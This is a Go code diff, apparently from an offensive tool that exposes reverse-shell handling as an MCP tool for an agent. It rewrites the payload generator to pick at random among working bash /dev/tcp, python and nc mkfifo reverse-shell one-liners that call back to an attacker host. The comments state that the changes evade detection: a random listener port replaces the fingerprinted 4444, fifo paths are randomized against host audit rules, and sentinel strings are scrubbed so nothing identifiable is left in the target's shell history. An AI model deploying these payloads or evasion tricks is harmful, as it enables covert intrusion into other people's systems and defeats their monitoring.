@@ -26,6 +26,7 @@ package server
 import (
 	"context"
 	"crypto/rand"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -40,9 +41,11 @@ import (
 	"time"
 
 	"github.com/Autumn-27/artex/agent"
+	"github.com/Autumn-27/artex/config"
 	"github.com/Autumn-27/artex/db"
 	"github.com/Autumn-27/artex/mcphttp"
 	"github.com/Autumn-27/artex/session"
+	"github.com/Autumn-27/artex/tunnel"
 	actool "github.com/Autumn-27/norma/tool"
 )
 
@@ -52,8 +55,28 @@ const reverseSyncInterval = 10 * time.Second
 // reverseStartTimeout 是等 penelope 的 MCP/监听端口就绪的上限。
 const reverseStartTimeout = 15 * time.Second
 
-// defaultReversePort 是 reverse_listen 未指定 port 时的默认反弹监听口。
-const defaultReversePort = 4444
+// randomReversePort 从隧道端口池(config tunnel_port_range,默认 20000-21000)随机
+// 挑一个真实可绑的端口(批 7 P0-5:固定默认 4444 是反弹 shell 的教科书指纹;
+// 也不复用 tunnel.AllocatePort 的「顺序取首个空闲」——低水位确定性选择本身也是特征)。
+// 试绑后释放再交 penelope 绑定,竞态窗口可接受(与 MCP 端口分配同款取舍)。
+func randomReversePort() (int, error) {
+	min, max, err := tunnel.ParsePortRange(config.TunnelPortRange())
+	if err != nil {
+		return 0, err
+	}
+	span := max - min + 1
+	for i := 0; i < 32; i++ {
+		var b [2]byte
+		if _, err := rand.Read(b[:]); err != nil {
+			return 0, fmt.Errorf("反弹端口随机失败: %w", err)
+		}
+		p := min + int(binary.BigEndian.Uint16(b[:]))%span
+		if tunnel.CanListen(p) {
+			return p, nil
+		}
+	}
+	return 0, fmt.Errorf("端口池 %d-%d 随机挑 32 次均不可绑", min, max)
+}
 
 // mcpCaller 是 reverseShell 依赖的最小 MCP 调用面(*mcphttp.Client 满足;
 // 单测注入假实现)。
@@ -175,11 +198,31 @@ func diffPenSessions(active []int, known map[int]int64) (newIDs []int, dead map[
 }
 
 // reversePayloads 生成常用回连 payload(host=ARTEX_CALLBACK_ADDR 的主机部分)。
+// 批 7 P0-5:教科书形态是主机审计规则的命中点——fifo/临时文件路径每次随机
+// (/tmp/.<rand>,不再是固定的 /tmp/f),bash/python/nc 各备等价变体随机选用;
+// bash 的 /dev/tcp 是内建语法无法伪装,变体差异放在命令拼接形态上。
 func reversePayloads(host string, port int) map[string]string {
+	var fb [5]byte
+	_, _ = rand.Read(fb[:])
+	fifo := "/tmp/." + hex.EncodeToString(fb[:])
+	pick := func(variants ...string) string {
+		var b [1]byte
+		_, _ = rand.Read(b[:])
+		return variants[int(b[0])%len(variants)]
+	}
 	return map[string]string{
-		"bash": fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port),
-		"python": fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket();s.connect((%q,%d));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`, host, port),
-		"nc": fmt.Sprintf("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %d >/tmp/f", host, port),
+		"bash": pick(
+			fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port),
+			fmt.Sprintf("exec 196<>/dev/tcp/%s/%d;bash -i <&196 >&196 2>&196", host, port),
+		),
+		"python": pick(
+			fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket();s.connect((%q,%d));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`, host, port),
+			fmt.Sprintf(`python3 -c 'import socket,os;s=socket.socket();s.connect((%q,%d));[os.dup2(s.fileno(),f) for f in (0,1,2)];os.system("/bin/bash -i")'`, host, port),
+		),
+		"nc": pick(
+			fmt.Sprintf("rm -f %[1]s;mkfifo %[1]s;cat %[1]s|/bin/bash -i 2>&1|nc %s %d >%[1]s", fifo, host, port),
+			fmt.Sprintf("mkfifo %[1]s;/bin/bash -i <%[1]s 2>&1|nc %s %d >%[1]s;rm -f %[1]s", fifo, host, port),
+		),
 	}
 }
 
@@ -601,8 +644,9 @@ func (sh *reverseShell) ID() int64    { return sh.id }
 func (sh *reverseShell) Kind() string { return "reverse" }
 
 // Test 连通性探测:echo 哨兵,回显含哨兵才算活。
+// 哨兵为纯随机 hex(批 7 P0-3:无语义前缀——固定字样会留在目标 shell history)。
 func (sh *reverseShell) Test(ctx context.Context) error {
-	sentinel := "artex_pen_" + hex.EncodeToString(func() []byte { b := make([]byte, 6); _, _ = rand.Read(b); return b }())
+	sentinel := hex.EncodeToString(func() []byte { b := make([]byte, 8); _, _ = rand.Read(b); return b }())
 	stdout, _, err := sh.Exec(ctx, "echo "+sentinel, 10*time.Second)
 	if err != nil {
 		return err
@@ -763,7 +807,7 @@ func (s *Server) reverseListenTool() actool.CoreTool {
 		Schema: map[string]any{
 			"type": "object",
 			"properties": map[string]any{
-				"port":  map[string]any{"type": "integer", "description": "反弹监听端口(默认 4444;handler 已运行时必须与运行端口一致)"},
+				"port":  map[string]any{"type": "integer", "description": "反弹监听端口(缺省从隧道端口池随机挑一个空闲高位端口;handler 已运行时必须与运行端口一致)"},
 				"iface": strParam("监听网卡 IP(默认 127.0.0.1;目标直连回连传 0.0.0.0 或网卡 IP)"),
 			},
 		},
@@ -776,7 +820,11 @@ func (s *Server) reverseListenTool() actool.CoreTool {
 			}
 			_ = json.Unmarshal(in, &a)
 			if a.Port <= 0 {
-				a.Port = defaultReversePort
+				p, perr := randomReversePort()
+				if perr != nil {
+					return actool.Errorf("反弹端口分配失败：" + perr.Error()), nil
+				}
+				a.Port = p
 			}
 			if a.Port > 65535 {
 				return actool.Errorf(fmt.Sprintf("port 非法： %d", a.Port)), nil
